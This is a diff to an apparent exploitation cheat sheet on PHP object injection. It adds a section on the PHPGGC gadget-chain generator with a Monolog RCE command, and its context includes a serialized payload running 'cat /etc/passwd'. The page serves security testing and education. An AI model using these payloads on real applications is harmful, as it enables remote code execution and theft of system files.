@@ -130,8 +130,25 @@ echo urlencode(serialize(new PHPObjectInjection));
 //'O:18:"PHPObjectInjection":1:{s:6:"inject";s:26:"system(\'cat+/etc/passwd\');";}'
 ```
 
+## Finding and using gadgets
+
+[PHPGGC](https://github.com/ambionics/phpggc) is a tool built to generate the payload based on several frameworks:
+
+- Laravel
+- Symfony
+- SwiftMailer
+- Monolog
+- SlimPHP
+- Doctrine
+- Guzzle
+
+```powershell
+phpggc monolog/rce1 'phpinfo();' -s
+```
+
 ## Thanks to
 
-* [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
-* [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
-* [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
+- [PHP Object Injection - OWASP](https://www.owasp.org/index.php/PHP_Object_Injection)
+- [PHP Object Injection - Thin Ba Shane](http://location-href.com/php-object-injection/)
+- [PHP unserialize](http://php.net/manual/en/function.unserialize.php)
+- [PHP Generic Gadget - ambionics security](https://www.ambionics.io/blog/php-generic-gadget-chains)
